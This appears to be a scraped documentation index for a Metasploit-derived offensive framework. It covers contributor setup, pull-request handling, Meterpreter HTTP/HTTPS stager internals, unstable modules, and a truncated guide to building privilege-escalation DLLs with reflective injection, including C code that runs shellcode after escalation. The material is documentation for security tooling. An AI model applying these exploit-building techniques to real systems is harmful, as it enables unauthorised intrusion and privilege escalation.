install bundler bundle install If you encounter an error with the above command, refer to the bundle output and search for the error message along with the name of the gem that failed. Likely, you'll need to apt get install a dependency that is required by that particular gem. If it was something else, open a new issue to let us know what happened. Congratulations! You have now set up a development environment and the latest version of THG. Optional: Set up the REST API and PostgreSQL database The following optional section describes how to manually install PostgreSQL and set up the THG database. Alternatively, use our Omnibus installer which handles this more reliably. Click to expand. 1. Confirm that the PostgreSQL server and client are installed: sudo apt update && sudo apt-get install -y postgresql postgresql-client sudo service postgresql start && sudo update-rc.d postgresql enable 2. Ensure that you are not running as the root user. 3. Initialize the THG database: cd ~/git/THG-framework ./THGdb init 4. If you receive an error about a component not being installed, confirm that the binaries shown are in your path using the [which] and [find] commands, then modifying your [$PATH] environment variable. If it was something else, open a [new issue] to let us know what happened. 5. If the `THGdb init` command succeeds, then confirm that the database is accessible to THG: $ ./THGconsole -qx \"db_status; exit\" Congratulations! You have now set up the [THG Web Service (REST API)][THG-web-service] and the backend database. Optional: Tips to speed up common workflows The following section is optional but may improve your efficiency. Click to expand. - Making sure you're in the right directory to run `THGconsole` can become tedious, so consider using the following Bash alias: echo 'alias THGconsole=\"pushd $HOME/git/THG-framework && ./THGconsole && popd\"' >> ~/.bash_aliases - Consider generating a GPG key to sign your commits. Read about [why][git-horror] and [how][signing-howto]. - Developers tend to customize their own [git aliases] to speed up common commands, but here are a few common ones: [alias] # An easy, colored oneline log format that shows signed/unsigned status nicelog = log --pretty=format:'%Cred%h%Creset -%Creset %s %Cgreen(%cr) %C(bold blue)<%aE>%Creset [%G?]' # Shorthand commands to always sign (-S) and always edit the commit message. m = merge -S --no-ff --edit c = commit -S --edit # Shorthand to always blame (praise) without looking at whitespace changes b= blame -w - If you plan on working with other contributor's pull requests, you may run the following script which makes it easier to do so: tools/dev/add_pr_fetch.rb After running the above script, you can `checkout` other pull requests more easily: git fetch upstream git checkout fixes-to-pr-12345 upstream/pr/12345 - If you're writing test cases (which you should), then make sure [rspec] works: rake spec You should see over 9000 tests run, mostly resulting in green dots, a few in yellow stars, and no red errors. Great! Now what? We're excited to see your upcoming contributions of new modules, documentation, and fixes! Check out our wiki documentation and, if you're looking for inspiration, keep an eye out for newbie-friendly pull requests and issues . Please submit your new pull requests and reach out to us on Slack for community help. Finally, we welcome your feedback on this guide, so feel free to reach out to us on Slack or open a new issue . For their significant contributions to this guide, we would like to thank @kernelsmith , @corelanc0d3r , and @ffmike .","title":"Setting Up a thg Development Environment"},{"location":"dev/dark/Setting-Up-a-thg-Development-Environment/#assumptions","text":"You have installed an apt-based Linux environment, such as Ubuntu or Kali . You have created a GitHub account and associated an ssh key with it. You have familiarity with Git and Github, or have completed the Github bootcamp . For optional database and REST API functionality, you will need regular user account that is not root .","title":"Assumptions"},{"location":"dev/dark/Setting-Up-a-thg-Development-Environment/#install-dependencies","text":"Open a terminal on your Linux host and set up Git, build tools, and Ruby dependencies: sudo apt update && sudo apt install -y git autoconf build-essential libpcap-dev libpq-dev zlib1g-dev libsqlite3-dev","title":"Install dependencies"},{"location":"dev/dark/Setting-Up-a-thg-Development-Environment/#set-up-your-local-copy-of-the-repository","text":"You will need to use Github to create a fork for your contributions and receive the latest updates from our repository. Login to Github and click the \"Fork\" button in the top-right corner of the THG-framework repository. Create a git directory in your home folder and clone your fork to your local machine: export GITHUB_USERNAME = YOUR_USERNAME_FOR_GITHUB export GITHUB_EMAIL = YOUR_EMAIL_ADDRESS_FOR_GITHUB mkdir -p ~/git cd ~/git git clone git@github.com: $GITHUB_USERNAME /THG-framework cd ~/git/THG-framework If you encounter a \"permission denied\" error on the above command, research the error message. If there isn't an explicit reason given, confirm that your Github SSH key is configured correctly . To receive updates, you will create an upstream-master branch to track the Rapid7 remote repository, alongside your master branch which will point to your personal repository's fork: git remote add upstream git@github.com:rapid7/THG-framework.git git fetch upstream git checkout -b upstream-master --track upstream/master Configure your Github username, email address, and username. Ensure your user.email matches the email address you registered with your Github account. git config --global user.name \" $GITHUB_USERNAME \" git config --global user.email \" $GITHUB_EMAIL \" git config --global github.user \" $GITHUB_USERNAME \" Set up THGtidy to run before each git commit and after each git merge to quickly identify potential issues with your contributions: cd ~/git/THG-framework ln -sf ../../tools/dev/pre-commit-hook.rb .git/hooks/pre-commit ln -sf ../../tools/dev/pre-commit-hook.rb .git/hooks/post-merge","title":"Set up your local copy of the repository"},{"location":"dev/dark/Setting-Up-a-thg-Development-Environment/#install-ruby","text":"Linux distributions do not ship with the latest Ruby, nor are package managers routinely updated. Additionally, if you are working with multiple Ruby projects, each one has dependencies and Ruby versions which can start to conflict. For these reasons, it is advisable to use a Ruby manager. You could just install Ruby directly (eg. sudo apt install ruby-dev ), but you may likely end up with the incorrect version and no way to update. Instead, consider using one of the many different Ruby environment managers available. The THG team prefers rbenv and rvm . Regardless of your choice, you'll want to make sure that, when inside the ~/git/THG-framework directory, you are running the correct version of Ruby: $ cd ~/git/THG-framework $ cat .ruby-version 2.5.3 $ ruby -v ruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-linux-gnu] Note: the Ruby version is likely to change over time, so don't rely on the output in the above example. Instead, confirm your ruby -v output with the version number listed in the .ruby-version file. If the two versions don't match, restart your terminal. If that does not work, consult the troubleshooting documentation for your Ruby environment manager. Unfortunately, troubleshooting the Ruby environment is beyond the scope of this document, but feel free to reach out for community support using the links at the bottom of this document.","title":"Install Ruby"},{"location":"dev/dark/Setting-Up-a-thg-Development-Environment/#install-gems","text":"Before you run THG, you will need to update the gems (Ruby libraries) that THG depends on: cd ~/git/THG-framework/ gem install bundler bundle install If you encounter an error with the above command, refer to the bundle output and search for the error message along with the name of the gem that failed. Likely, you'll need to apt get install a dependency that is required by that particular gem. If it was something else, open a new issue to let us know what happened. Congratulations! You have now set up a development environment and the latest version of THG.","title":"Install Gems"},{"location":"dev/dark/Setting-Up-a-thg-Development-Environment/#optional-set-up-the-rest-api-and-postgresql-database","text":"The following optional section describes how to manually install PostgreSQL and set up the THG database. Alternatively, use our Omnibus installer which handles this more reliably. Click to expand. 1. Confirm that the PostgreSQL server and client are installed: sudo apt update && sudo apt-get install -y postgresql postgresql-client sudo service postgresql start && sudo update-rc.d postgresql enable 2. Ensure that you are not running as the root user. 3. Initialize the THG database: cd ~/git/THG-framework ./THGdb init 4. If you receive an error about a component not being installed, confirm that the binaries shown are in your path using the [which] and [find] commands, then modifying your [$PATH] environment variable. If it was something else, open a [new issue] to let us know what happened. 5. If the `THGdb init` command succeeds, then confirm that the database is accessible to THG: $ ./THGconsole -qx \"db_status; exit\" Congratulations! You have now set up the [THG Web Service (REST API)][THG-web-service] and the backend database.","title":"Optional: Set up the REST API and PostgreSQL database"},{"location":"dev/dark/Setting-Up-a-thg-Development-Environment/#optional-tips-to-speed-up-common-workflows","text":"The following section is optional but may improve your efficiency. Click to expand. - Making sure you're in the right directory to run `THGconsole` can become tedious, so consider using the following Bash alias: echo 'alias THGconsole=\"pushd $HOME/git/THG-framework && ./THGconsole && popd\"' >> ~/.bash_aliases - Consider generating a GPG key to sign your commits. Read about [why][git-horror] and [how][signing-howto]. - Developers tend to customize their own [git aliases] to speed up common commands, but here are a few common ones: [alias] # An easy, colored oneline log format that shows signed/unsigned status nicelog = log --pretty=format:'%Cred%h%Creset -%Creset %s %Cgreen(%cr) %C(bold blue)<%aE>%Creset [%G?]' # Shorthand commands to always sign (-S) and always edit the commit message. m = merge -S --no-ff --edit c = commit -S --edit # Shorthand to always blame (praise) without looking at whitespace changes b= blame -w - If you plan on working with other contributor's pull requests, you may run the following script which makes it easier to do so: tools/dev/add_pr_fetch.rb After running the above script, you can `checkout` other pull requests more easily: git fetch upstream git checkout fixes-to-pr-12345 upstream/pr/12345 - If you're writing test cases (which you should), then make sure [rspec] works: rake spec You should see over 9000 tests run, mostly resulting in green dots, a few in yellow stars, and no red errors.","title":"Optional: Tips to speed up common workflows"},{"location":"dev/dark/Setting-Up-a-thg-Development-Environment/#great-now-what","text":"We're excited to see your upcoming contributions of new modules, documentation, and fixes! Check out our wiki documentation and, if you're looking for inspiration, keep an eye out for newbie-friendly pull requests and issues . Please submit your new pull requests and reach out to us on Slack for community help. Finally, we welcome your feedback on this guide, so feel free to reach out to us on Slack or open a new issue . For their significant contributions to this guide, we would like to thank @kernelsmith , @corelanc0d3r , and @ffmike .","title":"Great!  Now what?"},{"location":"dev/dark/So-Your-PR-was-closed/","text":"Congratulations! You managed to brave the storms of git and the dire straits of Ruby and submit a Pull Request. However, someone just closed it :(. This doesn't have to mean the end of your contributing career. Below are some ways to keep moving after one of your PRs is closed. Moved to the attic When we move something to the attic it means that what you submitted is a thing that we want but the circumstances were not quite right for landing it. Sometimes this is on us, and sometimes the contribution needs more work. We recognize that contributors work on the PRs they submit at their own pace. Take a look at the comments and review suggestions on your PR, and feel free to re-open it if and when you have time to work on it again. Don't think you'll be able to get it across the finish line? Find a community champion to do it for you. Your submitted a PR from your master branch Because of how GitHub tracks changes between branches and what got added in a particular PR, we don't accept contributions from the master branch of your fork. All branches are required to be unique . If your PR is closed because of this, create a new branch with that code and we'll be happy to look at it again! git checkout -b <BRANCH_NAME> git push <your_fork_remote> <BRANCH_NAME> This helps protect the process, ensure users are aware of commits on the branch being considered for merge, allows for a location for more commits to be offered without mingling with other contributor changes and allows contributors to make progress while a PR is still being reviewed.","title":"So Your PR was closed"},{"location":"dev/dark/So-Your-PR-was-closed/#moved-to-the-attic","text":"When we move something to the attic it means that what you submitted is a thing that we want but the circumstances were not quite right for landing it. Sometimes this is on us, and sometimes the contribution needs more work. We recognize that contributors work on the PRs they submit at their own pace. Take a look at the comments and review suggestions on your PR, and feel free to re-open it if and when you have time to work on it again. Don't think you'll be able to get it across the finish line? Find a community champion to do it for you.","title":"Moved to the attic"},{"location":"dev/dark/So-Your-PR-was-closed/#your-submitted-a-pr-from-your-master-branch","text":"Because of how GitHub tracks changes between branches and what got added in a particular PR, we don't accept contributions from the master branch of your fork. All branches are required to be unique . If your PR is closed because of this, create a new branch with that code and we'll be happy to look at it again! git checkout -b <BRANCH_NAME> git push <your_fork_remote> <BRANCH_NAME> This helps protect the process, ensure users are aware of commits on the branch being considered for merge, allows for a location for more commits to be offered without mingling with other contributor changes and allows contributors to make progress while a PR is still being reviewed.","title":"Your submitted a PR from your master branch"},{"location":"dev/dark/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers/","text":"Recent changes to HTTP and HTTPS communications in both Meterpreter and its stagers have caused new behaviours that have left some users confused. The aim of this post is to cover the changes that have been made, the rationale behind those changes, and the issues that come with them. By the end of this post, readers should have a clear understanding of the issues related to HTTP/S communications, and be able to diagnose and fix any issues that they might be having. Windows HTTP APIs The Windows API comes with two ways to talk via HTTP/S, they are WinInet and WinHTTP . The APIs are consumed in a similar fashion; many of the functions in each have the same interface, or are at least close enough to make a transition between the two rather trivial. However, there are some underlying differences that are important. The WinInet API was designed for use in desktop applications. It provides all the features required by applications to use HTTP/S while delegating much of the responsibilty of handling implementation detail to the underlying API and OS. This API can result in some user interface elements appearing if not handled correctly. WinInet comes with some limitations, one of which is that it's close to impossible to do any kind of custom validation, parsing, or handling of SSL communications. One of the needs of Metasploit users is to be able to enable a Paranoid Mode that forces Meterpreter to only talk with the appropriate endpoint. The goal is to prevent shells from being hijacked by unauthorised users. In order to do this, one of the things that was implemented was the verification of the SHA1 hash of the SSL certificate that Meterpreter reads from the server. If this hash doesn't match the one that Meterpreter is configured with, Meterpreter will shut down. WinInet doesn't make this process possible without a lot of custom work. For applications such as this, WinHTTP is the \"preferred\" option as deemed by Microsoft. This API is designed to work under a service, and provides a greater number of ways to interact with communications made over HTTP/S. With this API it was trivial to implement the SHA1 hash verification and force Meterpreter to shut down when a MITM is detected. For a full comparison of the feature differences, please see this feature matrix on MSDN. Meterpreter's Implementation Meterpreter now makes use of WinHTTP by default so that the new features are accommodated, but unfortuanetly this doesn't come for free. Behind the scenes, this API does not make any use of the current user's Internet Explorer configuration settings, where the WinInet API does. This means that if the current user has a proxy configured, extra code needs to be added to make use of the current Internet Explorer settings in WinHTTP . Meterpreter has been modified to do this, however there is still one limitation that is in place. As indicated in a blog post on MSDN : WinHTTP strictly requires HTTP/1.1 compliance for keeping the connection alive and HTTP Keep-Alives are not supported in HTTP/1.0 protocol. HTTP Keep-Alive feature was introduced in the HTTP/1.1 protocol as per RFC 2616. The server or the proxy which expects the keep-alive should also implement the protocol correctly. WinHTTP on Windows 7, Windows 2008 R2 are strict in terms of security wrto protocol compliance. The ideal solution is to change the server/proxy to use the right protocol and be RFC compliant. What this means is that from Windows 7 and onwards, the underlying WinHTTP implementation requires proper HTTP/1.1 support from any proxies that are used. If a proxy uses HTTP/1.0, such as Squid 2.7, and requires Keep-Alive support, such as NTLM authentication, then WinHTTP will refuse to talk to it. Instead of downgrading, it will expect a purely RFC-compliant implementation, and instead will return a 407 error the client. This means that for Meterpreter to work, WinHTTP can't be used. In order to avoid this issue, extra work has beeen done to force Meterpreter to fall back to WinInet when this happens. Given that WinInet doesn't do certificate hash verification, this means that the user of Meterpreter loses the ability to use paranoid mode. It was decided that Meterpreter would not fallback to WinInet if paranoid mode was enabled, as the intention of the user is clearly to avoid MITM. To sum up, Meterpreter will use WinHTTP where it can. If it can't, it'll fall back to WinInet unless paranoid mode is enabled. Metasploit HTTP and HTTPS Stagers Metasploit users have long since known about the reverse_http and reverse_https stagers, and have made good use of them over time. What many don't know is that these stagers use the WinInet API, which means that they don't get SSL certificate validation (so no paranoid mode). To provide support for paranoid mode directly inside the stager, ultimately preventing the download of Meterpreter at all in the case of MITM, new stagers were required. reverse_winhttp and reverse_winhttps are implementations of stagers that make use of WinHTTP , and in the latter case, provides support for paranoid mode. They do, however come with the same implicit limitation as Meterpreter itself in that they may not be able to provide proxy support thanks to the strict RFC compliance described in the previous section. The big difference here is that the stager does not have a fallback implementation like Meterpreter does, as this would make the stager way too big. Therefore, if an older proxy is in place that doesn't confirm to HTTP/1.1, the stager will fail. Combining Stagers with Meterpreter It's important to note that the implementations of communications inside the stagers are completely separate to those inside Meterpreter. If you use windows/meterpreter/reverse_https , then the stager will use WinInet and Meterpreter will use WinHTTP . It isn't possible to \"hand over\" communications from the stager to Meterpreter in this case, and it wouldn't make sense anyway because HTTP/S is stateless. This is the most common set up because many people don't realise that the reverse_winhttp/s payloads exist! Prior to the WinInet fallback work, those people hitting the HTTP/1.0 proxy issue would find themselves with the following scenario: They would exploit a Windows 7 (or later) target in some way, whether it be via a browser exploit, or through a social engineering attack. The payload that was executed was meterpreter/reverse_https , and so the initial connection would come via WinInet . WinInet would successfully use the current user's proxy configuration and the initial connection back to Metasploit would be successful. The stager would download the second stage ( metsrv ), and reflectively load it so that Meterpreter could take over. Meterpreter would attempt to connect again to Metasploit, this time using WinHTTP . The proxy would return HTTP/1.0 responses, resulting in WinHTTP refusing to function. The Meterpreter session would be considered \"dead\" by Metasploit as a result of the lack of successful communications after staging. Examples of these issues are this and this . If you are seeing similar issues it's because your current Meterpreter binaries don't have the fallback option. Conclusion HTTP/S communications in Windows is a hairy beast, and trying to cater for all cases proves to be quite tricky thanks to the limitations of some APIs, and the variable implementations of others. We're still working to iron out all of issues, and so please log an issue if you stumble on an edge case that hasn't yet been covered. Thank you for your patience! OJ / @TheColonial","title":"The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers"},{"location":"dev/dark/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers/#windows-http-apis","text":"The Windows API comes with two ways to talk via HTTP/S, they are WinInet and WinHTTP . The APIs are consumed in a similar fashion; many of the functions in each have the same interface, or are at least close enough to make a transition between the two rather trivial. However, there are some underlying differences that are important. The WinInet API was designed for use in desktop applications. It provides all the features required by applications to use HTTP/S while delegating much of the responsibilty of handling implementation detail to the underlying API and OS. This API can result in some user interface elements appearing if not handled correctly. WinInet comes with some limitations, one of which is that it's close to impossible to do any kind of custom validation, parsing, or handling of SSL communications. One of the needs of Metasploit users is to be able to enable a Paranoid Mode that forces Meterpreter to only talk with the appropriate endpoint. The goal is to prevent shells from being hijacked by unauthorised users. In order to do this, one of the things that was implemented was the verification of the SHA1 hash of the SSL certificate that Meterpreter reads from the server. If this hash doesn't match the one that Meterpreter is configured with, Meterpreter will shut down. WinInet doesn't make this process possible without a lot of custom work. For applications such as this, WinHTTP is the \"preferred\" option as deemed by Microsoft. This API is designed to work under a service, and provides a greater number of ways to interact with communications made over HTTP/S. With this API it was trivial to implement the SHA1 hash verification and force Meterpreter to shut down when a MITM is detected. For a full comparison of the feature differences, please see this feature matrix on MSDN.","title":"Windows HTTP APIs"},{"location":"dev/dark/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers/#meterpreters-implementation","text":"Meterpreter now makes use of WinHTTP by default so that the new features are accommodated, but unfortuanetly this doesn't come for free. Behind the scenes, this API does not make any use of the current user's Internet Explorer configuration settings, where the WinInet API does. This means that if the current user has a proxy configured, extra code needs to be added to make use of the current Internet Explorer settings in WinHTTP . Meterpreter has been modified to do this, however there is still one limitation that is in place. As indicated in a blog post on MSDN : WinHTTP strictly requires HTTP/1.1 compliance for keeping the connection alive and HTTP Keep-Alives are not supported in HTTP/1.0 protocol. HTTP Keep-Alive feature was introduced in the HTTP/1.1 protocol as per RFC 2616. The server or the proxy which expects the keep-alive should also implement the protocol correctly. WinHTTP on Windows 7, Windows 2008 R2 are strict in terms of security wrto protocol compliance. The ideal solution is to change the server/proxy to use the right protocol and be RFC compliant. What this means is that from Windows 7 and onwards, the underlying WinHTTP implementation requires proper HTTP/1.1 support from any proxies that are used. If a proxy uses HTTP/1.0, such as Squid 2.7, and requires Keep-Alive support, such as NTLM authentication, then WinHTTP will refuse to talk to it. Instead of downgrading, it will expect a purely RFC-compliant implementation, and instead will return a 407 error the client. This means that for Meterpreter to work, WinHTTP can't be used. In order to avoid this issue, extra work has beeen done to force Meterpreter to fall back to WinInet when this happens. Given that WinInet doesn't do certificate hash verification, this means that the user of Meterpreter loses the ability to use paranoid mode. It was decided that Meterpreter would not fallback to WinInet if paranoid mode was enabled, as the intention of the user is clearly to avoid MITM. To sum up, Meterpreter will use WinHTTP where it can. If it can't, it'll fall back to WinInet unless paranoid mode is enabled.","title":"Meterpreter's Implementation"},{"location":"dev/dark/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers/#metasploit-http-and-https-stagers","text":"Metasploit users have long since known about the reverse_http and reverse_https stagers, and have made good use of them over time. What many don't know is that these stagers use the WinInet API, which means that they don't get SSL certificate validation (so no paranoid mode). To provide support for paranoid mode directly inside the stager, ultimately preventing the download of Meterpreter at all in the case of MITM, new stagers were required. reverse_winhttp and reverse_winhttps are implementations of stagers that make use of WinHTTP , and in the latter case, provides support for paranoid mode. They do, however come with the same implicit limitation as Meterpreter itself in that they may not be able to provide proxy support thanks to the strict RFC compliance described in the previous section. The big difference here is that the stager does not have a fallback implementation like Meterpreter does, as this would make the stager way too big. Therefore, if an older proxy is in place that doesn't confirm to HTTP/1.1, the stager will fail.","title":"Metasploit HTTP and HTTPS Stagers"},{"location":"dev/dark/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers/#combining-stagers-with-meterpreter","text":"It's important to note that the implementations of communications inside the stagers are completely separate to those inside Meterpreter. If you use windows/meterpreter/reverse_https , then the stager will use WinInet and Meterpreter will use WinHTTP . It isn't possible to \"hand over\" communications from the stager to Meterpreter in this case, and it wouldn't make sense anyway because HTTP/S is stateless. This is the most common set up because many people don't realise that the reverse_winhttp/s payloads exist! Prior to the WinInet fallback work, those people hitting the HTTP/1.0 proxy issue would find themselves with the following scenario: They would exploit a Windows 7 (or later) target in some way, whether it be via a browser exploit, or through a social engineering attack. The payload that was executed was meterpreter/reverse_https , and so the initial connection would come via WinInet . WinInet would successfully use the current user's proxy configuration and the initial connection back to Metasploit would be successful. The stager would download the second stage ( metsrv ), and reflectively load it so that Meterpreter could take over. Meterpreter would attempt to connect again to Metasploit, this time using WinHTTP . The proxy would return HTTP/1.0 responses, resulting in WinHTTP refusing to function. The Meterpreter session would be considered \"dead\" by Metasploit as a result of the lack of successful communications after staging. Examples of these issues are this and this . If you are seeing similar issues it's because your current Meterpreter binaries don't have the fallback option.","title":"Combining Stagers with Meterpreter"},{"location":"dev/dark/The-ins-and-outs-of-HTTP-and-HTTPS-communications-in-Meterpreter-and-Metasploit-Stagers/#conclusion","text":"HTTP/S communications in Windows is a hairy beast, and trying to cater for all cases proves to be quite tricky thanks to the limitations of some APIs, and the variable implementations of others. We're still working to iron out all of issues, and so please log an issue if you stumble on an edge case that hasn't yet been covered. Thank you for your patience! OJ / @TheColonial","title":"Conclusion"},{"location":"dev/dark/Uberhandler/","text":"Current Design Metasploit payload modules are Ruby Modules and come in three types: * Payload::Type::Single * Payload::Type::Stage * Payload::Type::Stager Payloads are created by creating an anonymous Class and including mixins for a Handler and either a single-stage payload or both a stage and stager, like so: def build_payload ( * modules ) klass = Class . new ( Payload ) # Remove nil modules modules . compact! # Include the modules supplied to us with the mad skillz # spoonfu style klass . include ( * modules . reverse ) return klass end The result is a Class for each combination of stage + stager + handler. E.g., windows/meterpreter/reverse_tcp includes Msf::Handler::ReverseTcp and the Module s defined in modules/payloads/stagers/windows/reverse_tcp and modules/payloads/stages/windows/meterpreter . As a corollary, this means that stages and stagers are intricately linked with each other and their handlers. What we need For the Uberhandler to function, it needs to: * Track how many exploits currently need its services * Be independent of the payload modules that use it The stagers need to: * Communicate to the handler what kind of stage to send From a user's perspective, we need some way to indicate a generic payload type along with the handler. The generic handlers were an early attempt at providing this same concept. Perhaps something like: set PAYLOAD uber/meterpreter/reverse_tcp","title":"Current Design"},{"location":"dev/dark/Uberhandler/#current-design","text":"Metasploit payload modules are Ruby Modules and come in three types: * Payload::Type::Single * Payload::Type::Stage * Payload::Type::Stager Payloads are created by creating an anonymous Class and including mixins for a Handler and either a single-stage payload or both a stage and stager, like so: def build_payload ( * modules ) klass = Class . new ( Payload ) # Remove nil modules modules . compact! # Include the modules supplied to us with the mad skillz # spoonfu style klass . include ( * modules . reverse ) return klass end The result is a Class for each combination of stage + stager + handler. E.g., windows/meterpreter/reverse_tcp includes Msf::Handler::ReverseTcp and the Module s defined in modules/payloads/stagers/windows/reverse_tcp and modules/payloads/stages/windows/meterpreter . As a corollary, this means that stages and stagers are intricately linked with each other and their handlers.","title":"Current Design"},{"location":"dev/dark/Uberhandler/#what-we-need","text":"For the Uberhandler to function, it needs to: * Track how many exploits currently need its services * Be independent of the payload modules that use it The stagers need to: * Communicate to the handler what kind of stage to send From a user's perspective, we need some way to indicate a generic payload type along with the handler. The generic handlers were an early attempt at providing this same concept. Perhaps something like: set PAYLOAD uber/meterpreter/reverse_tcp","title":"What we need"},{"location":"dev/dark/Unstable-Modules/","text":"Sometimes, modules contributed to Metasploit don't quite cross the finish line. This can be for a variety of reasons. Most often, it is because the module submission was a \"drive-by\" -- the original author is not interested (or not able) to implement and test needed changes in order to make the module production worthy. Luckily, git makes it easy to be a pack rat for these unfinished modules. We have a separate branch for these unstable modules, imaginatively named, Unstable . Landing to Unstable Unstable modules have their own special directory structure -- they should not hit the regular modules/ subdirectory, since we don't want to conflict with existing or future modules. We also want to make it easy to spot which modules are unstable. So, new modules should get landed there with the following procedure. First, get unstable up to date with upstream/master: git checkout unstable; git merge upstream/master; push upstream Create a local branch off of the PR: git checkout -b temp-pr1234 --track upstream/pr/1234 Create a local branch off of unstable: git checkout -b unstable-pr1234-modulename --track upstream/unstable Find the module paths: git diff upstream/master...upstream/pr/1234 --name-only Git checkout the module(s) in question: git checkout temp-pr1234 modules/exploits/path/to/module.rb Move the files to the appropriate directory: git mv modules/exploits/path/to/module.rb unstable-modules/exploits/incomplete Commit the result: git commit Send a pull request targeting the unstable branch, not the master branch: https://github.com/YOU/metasploit-framework/compare/rapid7:unstable...unstable-pr1234-modulename?expand=1 . Be sure to mention the original pull request number in the description so the PR will be updated accordingly. This assumes you're set up for development a la http://r-7.co/MSF-DEV with Rapid7's branch being the \"upstream\" repo. Example For an example of this procedure, see PR #2801 . Unstable Libraries If someone has library changes that cannot be merged to master, we cannot hang on to them in unstable. There is no sensible way to maintain that kind of branch over any reasonable time period, since conflicts will surely abound soon. Unstable scripts and plugins are okay, though. Rescuing unstable modules If you'd like to rescue an unstable module, great! Just note that it's an unstable rescue in the pull request, and the original PR number (if you can find it), when you pull it back out. You can do a similiar git checkout to grab the file and then git mv it to the right spot again. Safety This is not unstable in the Debian sense -- they're not latest versions, they get no fixes unless someone adopts them, and they may end up crashing out all of framework when loaded. No guarantees are made, ever, despite things like ExploitRanking.","title":"Unstable Modules"},{"location":"dev/dark/Unstable-Modules/#landing-to-unstable","text":"Unstable modules have their own special directory structure -- they should not hit the regular modules/ subdirectory, since we don't want to conflict with existing or future modules. We also want to make it easy to spot which modules are unstable. So, new modules should get landed there with the following procedure. First, get unstable up to date with upstream/master: git checkout unstable; git merge upstream/master; push upstream Create a local branch off of the PR: git checkout -b temp-pr1234 --track upstream/pr/1234 Create a local branch off of unstable: git checkout -b unstable-pr1234-modulename --track upstream/unstable Find the module paths: git diff upstream/master...upstream/pr/1234 --name-only Git checkout the module(s) in question: git checkout temp-pr1234 modules/exploits/path/to/module.rb Move the files to the appropriate directory: git mv modules/exploits/path/to/module.rb unstable-modules/exploits/incomplete Commit the result: git commit Send a pull request targeting the unstable branch, not the master branch: https://github.com/YOU/metasploit-framework/compare/rapid7:unstable...unstable-pr1234-modulename?expand=1 . Be sure to mention the original pull request number in the description so the PR will be updated accordingly. This assumes you're set up for development a la http://r-7.co/MSF-DEV with Rapid7's branch being the \"upstream\" repo.","title":"Landing to Unstable"},{"location":"dev/dark/Unstable-Modules/#example","text":"For an example of this procedure, see PR #2801 .","title":"Example"},{"location":"dev/dark/Unstable-Modules/#unstable-libraries","text":"If someone has library changes that cannot be merged to master, we cannot hang on to them in unstable. There is no sensible way to maintain that kind of branch over any reasonable time period, since conflicts will surely abound soon. Unstable scripts and plugins are okay, though.","title":"Unstable Libraries"},{"location":"dev/dark/Unstable-Modules/#rescuing-unstable-modules","text":"If you'd like to rescue an unstable module, great! Just note that it's an unstable rescue in the pull request, and the original PR number (if you can find it), when you pull it back out. You can do a similiar git checkout to grab the file and then git mv it to the right spot again.","title":"Rescuing unstable modules"},{"location":"dev/dark/Unstable-Modules/#safety","text":"This is not unstable in the Debian sense -- they're not latest versions, they get no fixes unless someone adopts them, and they may end up crashing out all of framework when loaded. No guarantees are made, ever, despite things like ExploitRanking.","title":"Safety"},{"location":"dev/dark/Using-ReflectiveDll-Injection/","text":"Using the ReflectiveDll loader in a metasploit module. First, let\u2019s be clear. I have used this exactly once, but there exists little in the way of guidance on how ReflectiveDll injection works in Framework, so I figure poor guidance is better than none. I am in part hoping that someone who knows how it works will come along and correct this, ala Cunningham\u2019s Law. This documentation assumes that you have some familiarity with DLLs already. Step 1- make your dll Use Visual studio 2013 and make a standard, empty dll. Do not attempt to add the reflective dll stuff yet. When you make the dll, make sure that you have at least three files: A header file with the function declarations, a c(pp) file with the functions that \u2018do\u2019 the exploit, and a dllMain file with the DllMain function. I find that testing the dll outside the reflective loader helps tremendously, so in the header file, I declare my working function as an extern , C-style function: extern \"C\" __declspec (dllexport) void PrivEsc(void); I think using C as the language over cpp would make life marginally easier, as you can combine the source code into one project. Using cpp meant I needed to have separate projects, or at least using my limited compiler knowledge that\u2019s how I got it to work. I noticed OJ was able to extend his c project ( https://github.com/rapid7/metasploit-framework/tree/master/external/source/exploits/capcom_sys_exec ) to include the reflectiveloader, but I could not seem to do the same for my cpp project. Store your project in external/source/exploits/<identifier>/<projectname> . That\u2019s not written in stone. The project I just finished had both dll and exe, so I have external/source/exploits/<identifier>/dll and external/source/exploits/<identifier>/exe . Just don't be a jerk and do something hard to follow. Your requirements may differ, and we're not super particular as long as it makes sense. I suggest the identifier to make life easier, then a project name because you\u2019ll be bringing the reflective loader project into the identifier folder, and at least I like to have some separation between the two. Step 2 Write the dll using an extern, C-linkage entry point to make testing easier In this case, I was writing a privesc, so I called it PrivEsc because I am super-imaginative and I have done enough code maintenance that I try to be nice to the next dev. By declaring it an external function and using C-style linkages, you can test the function independently using the rundll32.exe binary. For example, if the dll were named mydll.dll, you can run the privEsc alone with the command > rundll.exe mydll.dll, PrivEsc That way, you can isolate the behavior of the exploit before adding a payload. Because I was using a privesc, I just made the last line of the privesc system(\u201ccmd.exe\u201d); so I could verify that on the target machine. If I got a system-level cmd prompt, I won! Step 3 Add ReflectiveDll Injection to it. This is actually pretty simple. Once your code is doing what it is supposed to do, add the ReflectiveDll injection to it. Move the rdi (ReflectiveDll injection) code into your existing project and add the inject project into your solution. Again, this worked for me and appears to be a popular choice. When you copy the RefelctiveDll code into your project, you are going to replace your DllMain file with the ReflectiveDll.c file. Include the header file containing your desired entry point so that when DllMain gets launched, it can find your desired entry point. I also noticed and appreciated that others structured the code into two parts: Exploit and Exploiter. Exploiter does the heavy lifting with functions, and Exploit calls the functions and runs the shellcode after the exploit completes. For example, I made a privesc and the code required to accomplish the elevation was bundled in a function called PrivEsc contained within my Exploiter.cpp file. The Exploit file was very simple in comparison: #include <Windows.h> #include \"Exploit.h\" #include \"Exploiter.h\" static VOID ExecutePayload(LPVOID lpPayload) { VOID(*lpCode)() = (VOID(*)())lpPayload; lpCode(); return; } VOID Exploit(LPVOID lpPayload) { PrivEsc(); ExecutePayload(lpPayload); } That ExecutePayload function is there to... well.... Execute the payload. We'll talk about it later, but make sure that you have it accepting a pointer and executing it. That'll be how we get a payload into the running thread. All the Exploit.cpp needs to do is give a 